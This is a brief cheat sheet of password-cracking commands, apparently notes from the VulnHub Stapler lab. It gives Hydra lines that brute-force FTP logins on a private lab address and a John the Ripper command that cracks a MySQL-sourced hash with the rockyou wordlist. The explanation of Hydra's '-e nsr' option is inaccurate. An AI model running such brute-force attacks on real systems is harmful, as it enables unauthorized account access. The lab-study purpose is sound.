Bruteforce commands

Hydra

#1 FTP 
```
hydra -L usernames.txt -P usernames.txt 192.168.1.6 ftp

hydra -L users.txt -e nsr 192.168.1.6 ftp (nsr -> Using users.txt, bruteforcing the password in the reverse order)
```

https://medium.com/@bondo.mike/vulnhub-stapler-1-ab928900d614

John

#1 - Cracking password using wordlist
Here password hash is collected from mysql database
Content of hash.txt
John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.

> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Output - It identifies password of john from the word list.
